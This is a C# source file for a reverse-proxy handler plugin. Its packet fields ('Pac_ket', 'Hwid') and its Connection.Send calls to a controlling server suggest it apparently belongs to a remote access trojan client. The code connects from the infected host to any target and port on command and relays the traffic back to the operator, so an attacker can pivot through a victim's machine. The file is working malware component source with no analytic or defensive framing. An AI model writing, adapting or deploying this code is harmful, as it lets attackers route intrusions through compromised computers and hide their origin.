using MessagePackLib.MessagePack;
using Plugin;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;

namespace ReverseProxy.Handler
{
    public class HandleReverseProxy
    {
        public const int BUFFER_SIZE = 8192;
        public static readonly object _proxyClientsLock = new object();
        public static List<HandleReverseProxy> _proxyClients = new List<HandleReverseProxy>();
        public int ConnectionId { get; private set; }
        public Socket Handle { get; private set; }
        public string Target { get; private set; }
        public int Port { get; private set; }
        private byte[] _buffer;
        private bool _disconnectIsSend;

        public HandleReverseProxy(int ConnectionId, string Target, int Port)
        {
            this.ConnectionId = ConnectionId;
            this.Target = Target;
            this.Port = Port;
            this.Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            //Non-Blocking connect, so there is no need for a extra thread to create
            this.Handle.BeginConnect(Target, Port, Handle_Connect, null);
        }

        private void Handle_Connect(IAsyncResult ar)
        {
            try
            {
                this.Handle.EndConnect(ar);
            }
            catch { }

            if (this.Handle.Connected)
            {
                try
                {
                    this._buffer = new byte[BUFFER_SIZE];
                    this.Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
                }
                catch
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "reverseProxy";
                    msgpack.ForcePathObject("Option").AsString = "ReverseProxyConnectResponse";
                    msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                    msgpack.ForcePathObject("ConnectionId").AsInteger = ConnectionId;
                    msgpack.ForcePathObject("IsConnected").SetAsBoolean(false);
                    msgpack.ForcePathObject("LocalAddress").SetAsBytes(null);
                    msgpack.ForcePathObject("LocalPort").AsInteger = 0;
                    msgpack.ForcePathObject("HostName").AsString = Target;
                    Connection.Send(msgpack.Encode2Bytes());

                    Disconnect();
                }

                IPEndPoint localEndPoint = (IPEndPoint)this.Handle.LocalEndPoint;
                MsgPack msgpack1 = new MsgPack();
                msgpack1.ForcePathObject("Pac_ket").AsString = "reverseProxy";
                msgpack1.ForcePathObject("Option").AsString = "ReverseProxyConnectResponse";
                msgpack1.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack1.ForcePathObject("ConnectionId").AsInteger = ConnectionId;
                msgpack1.ForcePathObject("IsConnected").SetAsBoolean(true);
                msgpack1.ForcePathObject("LocalAddress").SetAsBytes(localEndPoint.Address.GetAddressBytes());
                msgpack1.ForcePathObject("LocalPort").AsInteger = localEndPoint.Port;
                msgpack1.ForcePathObject("HostName").AsString = Target;
                Connection.Send(msgpack1.Encode2Bytes());
            }
            else
            {
                MsgPack msgpack1 = new MsgPack();
                msgpack1.ForcePathObject("Pac_ket").AsString = "reverseProxy";
                msgpack1.ForcePathObject("Option").AsString = "ReverseProxyConnectResponse";
                msgpack1.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack1.ForcePathObject("ConnectionId").AsInteger = ConnectionId;
                msgpack1.ForcePathObject("IsConnected").SetAsBoolean(false);
                msgpack1.ForcePathObject("LocalAddress").SetAsBytes(null);
                msgpack1.ForcePathObject("LocalPort").AsInteger = 0;
                msgpack1.ForcePathObject("HostName").AsString = Target;
                Connection.Send(msgpack1.Encode2Bytes());
            }
        }

        private void AsyncReceive(IAsyncResult ar)
        {
            //Receive here data from e.g. a WebServer

            try
            {
                int received = Handle.EndReceive(ar);

                if (received <= 0)
                {
                    Disconnect();
                    return;
                }

                byte[] payload = new byte[received];
                Array.Copy(_buffer, payload, received);
                MsgPack msgpack1 = new MsgPack();
                msgpack1.ForcePathObject("Pac_ket").AsString = "reverseProxy";
                msgpack1.ForcePathObject("Option").AsString = "ReverseProxyData";
                msgpack1.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack1.ForcePathObject("ConnectionId").AsInteger = ConnectionId;
                msgpack1.ForcePathObject("Data").SetAsBytes(payload);
                Connection.Send(msgpack1.Encode2Bytes());
            }
            catch
            {
                Disconnect();
                return;
            }

            try
            {
                this.Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
            }
            catch
            {
                Disconnect();
                return;
            }
        }

        public void Disconnect()
        {
            if (!_disconnectIsSend)
            {
                _disconnectIsSend = true;
                //send to the Server we've been disconnected
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "reverseProxy";
                msgpack.ForcePathObject("Option").AsString = "ReverseProxyDisconnect";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("ConnectionId").AsInteger = ConnectionId;
                Connection.Send(msgpack.Encode2Bytes());
            }

            try
            {
                Handle.Close();
            }
            catch { }

            RemoveProxyClient(this.ConnectionId);
        }

        public void SendToTargetServer(byte[] data)
        {
            try
            {
                Handle.Send(data);
            }
            catch { Disconnect(); }
        }
        public void RemoveProxyClient(int connectionId)
        {
            try
            {
                lock (_proxyClientsLock)
                {
                    for (int i = 0; i < _proxyClients.Count; i++)
                    {
                        if (_proxyClients[i].ConnectionId == connectionId)
                        {
                            _proxyClients.RemoveAt(i);
                            break;
                        }
                    }
                }
            }
            catch { }
        }
    }
}
